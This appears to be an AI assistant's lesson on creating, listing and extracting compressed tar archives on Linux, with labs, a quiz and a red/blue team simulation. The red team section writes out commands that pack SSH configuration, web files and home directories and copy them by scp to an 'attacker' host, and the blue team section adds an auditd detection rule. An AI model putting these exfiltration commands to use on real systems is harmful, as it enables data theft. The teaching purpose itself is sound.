Perfect, Shahid.

We are now documenting:

# 🗂️ **Module 13 – Archive and Transfer Files**

## 📦 Lesson 1: Manage Compressed `tar` Archives

## *Format: Cybersecurity Documentation Protocol Ultra v5.0 — Master Grade Edition*

## 🔰 Introduction

The `tar` utility (`tape archive`) is a critical tool in Linux environments for **archiving multiple files** into a single archive file, often combined with compression tools like `gzip`, `bzip2`, or `xz`.
This lesson focuses on managing **compressed `tar` archives**, covering creation, extraction, inspection, and real-world backup/transfer use cases.

> 🧭 *Use Case*: Archiving logs, backing up web server files, or securely transferring forensic evidence.

---

## 🧠 Core Concepts (Feynman Style + Diagram)

### 🤔 What is `tar`?

> "`tar` is like putting many files into a suitcase so you can carry them together."

But…

* The suitcase can be zipped to save space (`gzip`, `bzip2`, etc.).
* You can also **peek inside**, **unpack**, or **repack** at will.

### 🧱 Compression Layers:

```plaintext
[file1.txt, file2.log, dirA/] → tar → archive.tar → gzip → archive.tar.gz
```

### 📦 Common Compression Types:

| Format     | Extension         | Compression Tool |
| ---------- | ----------------- | ---------------- |
| `.tar`     | Archive only      | `tar`            |
| `.tar.gz`  | gzip compression  | `gzip`           |
| `.tar.bz2` | bzip2 compression | `bzip2`          |
| `.tar.xz`  | xz compression    | `xz`             |

---

## 💻 Commands & Configs (RHEL 9 Real Output)

### 🔧 Create a compressed archive:

```bash
tar -czvf logs_backup.tar.gz /var/log
```

* `c`: Create
* `z`: Compress using gzip
* `v`: Verbose
* `f`: Filename to write to

### 🔍 List contents without extracting:

```bash
tar -tzvf logs_backup.tar.gz
```

### 📂 Extract a `.tar.gz` file:

```bash
tar -xzvf logs_backup.tar.gz -C /tmp/recovery/
```

### 🔁 Create using bzip2 or xz:

```bash
tar -cjvf logs_backup.tar.bz2 /var/log
tar -cJvf logs_backup.tar.xz /var/log
```

---

## 🧪 Labs

### 🟢 Beginner Lab: Create & Extract `tar.gz`

1. Create a test folder:

   ```bash
   mkdir -p ~/test_archive/{a,b}; touch ~/test_archive/a/file1.txt ~/test_archive/b/file2.txt
   ```
2. Archive it:

   ```bash
   tar -czvf test.tar.gz ~/test_archive
   ```
3. Extract:

   ```bash
   tar -xzvf test.tar.gz -C ~/extracted_test
   ```

---

### ⚙️ Tactical Lab: Scheduled Log Backup Script

```bash
#!/bin/bash
DATE=$(date +%F)
tar -czf /backup/logs-$DATE.tar.gz /var/log
```

* Schedule using `crontab`:

  ```bash
  0 1 * * * /root/scripts/backup_logs.sh
  ```

---

### 🎯 Simulation Lab: Evidence Packaging (Red Team Recovery)

**Scenario**: A red teamer archives `/home/redteam/tools/` and exfiltrates it via SCP.

```bash
tar -czf tools_evidence.tar.gz /home/redteam/tools/
scp tools_evidence.tar.gz attacker@192.168.10.55:/tmp/
```

---

## 🛡 Red/Blue Simulation

### 🔴 Red Team (Tactic: Exfiltration, Technique: T1560.001)

**MITRE ATT\&CK**: [T1560.001 - Archive via Utility](https://attack.mitre.org/techniques/T1560/001/)

```bash
tar -czf secrets.tar.gz /etc/ssh /var/www/html/ /home/dev/
```

### 🔵 Blue Team: Detection & Log Review

* **Auditd Rule**:

```bash
-w /bin/tar -p x -k detect-tar-use
```

* **Syslog Snippet**:

```plaintext
type=EXECVE msg=audit(...): argc=5 a0="tar" a1="-czf" a2="secrets.tar.gz" ...
```

---

## 🧠 Deep Quiz (Master Grade)

1. What does the `-f` option do in `tar`?
2. How would you list the contents of a `.tar.bz2` without extracting?
3. What's the difference between `-z`, `-j`, and `-J`?
4. Which MITRE technique covers data archival before exfiltration?
5. What command archives `/var/www/` with xz compression?

---

## 🗂 Summary Table + Checklist

| Task                  | Command                       | ✅ |
| --------------------- | ----------------------------- | - |
| Create gzip archive   | `tar -czvf file.tar.gz dir/`  | ✅ |
| Extract gzip archive  | `tar -xzvf file.tar.gz`       | ✅ |
| List archive contents | `tar -tzvf file.tar.gz`       | ✅ |
| Use bzip2 compression | `tar -cjvf file.tar.bz2 dir/` | ✅ |
| Use xz compression    | `tar -cJvf file.tar.xz dir/`  | ✅ |

---

## 📓 Journaling + Confidence Tracker

* 📅 **Date Practiced**: `____`
* 🔁 **Did you build the labs yourself?** Yes / No
* 💡 **Insights**: `___________________________________`
* 🔐 **Security Use Cases Observed**: `_________________________`
* ✅ **Confidence (1–5)**: `__`

---

## 🧭 Job & Cert Mapping

| Role        | Task                                                | Cert Domain     |
| ----------- | --------------------------------------------------- | --------------- |
| SOC Analyst | Review suspicious `.tar.gz` creation                | CEH, CompTIA+   |
| Sysadmin    | Automate log backups using `tar` and cron           | RHCSA, LPIC-1   |
| Pentester   | Package tools or loot before exfiltration           | OSCP, CEH       |
| IR Analyst  | Detect archive usage via Auditd or Sysmon (Windows) | Blue Team, GCFA |

---

## 🧠 Spaced Repetition Plan

* **Day 1**: Run all three compression types: gzip, bzip2, xz
* **Day 3**: Build a script to archive `/etc/` and restore it
* **Day 7**: Simulate attacker behavior (Red Team) + detect via Auditd
* **Day 30**: Teach this to a peer and document a real backup policy

---

Let me know the **next lesson** from Module 13, and I’ll continue with the same structure.

Would you like this in a downloadable `.md` file too?
